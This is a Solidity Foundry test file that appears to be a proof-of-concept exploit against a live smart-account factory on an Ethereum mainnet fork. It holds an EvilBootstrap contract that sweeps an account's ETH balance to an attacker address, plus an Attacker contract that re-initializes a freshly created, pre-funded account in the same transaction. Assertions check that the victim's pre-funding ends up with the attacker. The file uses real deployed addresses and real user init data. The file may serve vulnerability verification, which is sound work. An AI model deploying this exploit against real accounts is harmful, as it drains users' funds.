// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";

interface IStartaleAccountFactory {
    function createAccount(bytes calldata initData, bytes32 salt) external payable returns (address payable);
    function computeAccountAddress(bytes calldata initData, bytes32 salt) external view returns (address payable);
    function ACCOUNT_IMPLEMENTATION() external view returns (address);
}

interface IStartaleAccount {
    function initializeAccount(bytes calldata initData) external payable;
    function isInitialized() external view returns (bool);
}

/// @dev Attacker-controlled "bootstrap" that runs via delegatecall in the account context.
contract EvilBootstrap {
    address payable public immutable attacker;

    constructor(address payable a) {
        attacker = a;
    }

    function sweep() external {
        (bool ok,) = attacker.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}

contract Attacker {
    function attack(address factory, bytes calldata initData, bytes32 salt, bytes calldata evilInit)
        external
        returns (address acct)
    {
        acct = IStartaleAccountFactory(factory).createAccount(initData, salt);
        IStartaleAccount(acct).initializeAccount(evilInit);
    }
}

contract StartaleReinitTest is Test {
    address constant FACTORY = 0x0000003B3E7b530b4f981aE80d9350392Defef90;
    address constant IMPL = 0x000000b8f5f723A680d3D7EE624Fe0bC84a6E05A;
    // A real, valid initData taken from a live factory deployment (owner = a real Startale user).
    // Layout: 32-byte word (bootstrap address, right aligned) | 0x40 | len(call) | call.
    bytes constant REAL_INIT_DATA =
        hex"000000000000000000000000000000552a5fae3db7a8f3917c435448f49ba6a900000000000000000000000000000000000000000000000000000000"
        hex"0000004000000000000000000000000000000000000000000000000000000000000002045888596b0000000000000000000000000000000000000000"
        hex"0000000000000000000000c0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000"
        hex"000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000140000000000000000000000000"
        hex"00000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000001e00000000000000000"
        hex"000000000000000000000000000000000000000000000014c987fcdc88ddcd2cb190e27237e5860e88d8ab2e00000000000000000000000000000000"
        hex"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"000000400000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000"
        hex"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000000000000000000000000000000000000";

    function _rpc() internal view returns (string memory) {
        return vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
    }

    function setUp() public {
        vm.createSelectFork(_rpc());
    }

    /// @notice Live implementation/factory are byte-identical to the version exploited on 2026-09-16.
    function test_code_unchanged() public view {
        assertEq(FACTORY.codehash, 0x380e804ea7bd2dddac7e063329cab4ddaafd7ccc73441e369dbc8218f85b4797);
        assertEq(IMPL.codehash, 0x90713de607e95b2df2bdff40300cceb99b996db7a9b96675429a7bb15750ca67);
        assertEq(IStartaleAccountFactory(FACTORY).ACCOUNT_IMPLEMENTATION(), IMPL);
    }

    /// @notice A previously-deployed account can no longer be re-initialized (transient flag is tx-scoped).
    function test_post_tx_reinit_reverts() public {
        address deployed = 0x8BAf151C646F900981F3F54D2Ba876b39202fDCb; // live account created at block 26,328,124
        vm.expectRevert(bytes4(0xaed59595)); // NotInitializable()
        IStartaleAccount(deployed).initializeAccount(hex"00");
    }

    /// @notice Same-transaction re-initialization sweeps a pre-funded, freshly-deployed account.
    function test_same_tx_reinit_sweeps_prefund() public {
        bytes memory initData = REAL_INIT_DATA;

        bytes32 salt = keccak256("ca2-startale-poc-1"); // fresh address => deployable at head
        address payable acct = IStartaleAccountFactory(FACTORY).computeAccountAddress(initData, salt);
        assertEq(acct.code.length, 0, "account must not exist yet");

        uint256 prefund = 0.002 ether; // largest pre-funding observed on-chain in the last 200k blocks
        vm.deal(acct, prefund); // simulate the victim pre-funding its counterfactual address

        address payable attacker = payable(address(0xBEEF01));
        EvilBootstrap evil = new EvilBootstrap(attacker);
        bytes memory cd = abi.encodeCall(EvilBootstrap.sweep, ());
        bytes memory evilInit = abi.encodePacked(
            bytes32(uint256(uint160(address(evil)))), uint256(0x40), uint256(cd.length), cd
        );

        uint256 before = attacker.balance;
        new Attacker().attack(FACTORY, initData, salt, evilInit);

        assertEq(acct.code.length > 0, true, "account deployed");
        assertTrue(IStartaleAccount(acct).isInitialized(), "account initialized");
        assertEq(acct.balance, 0, "pre-funding gone");
        assertEq(attacker.balance - before, prefund, "attacker received the pre-funding");
    }
}
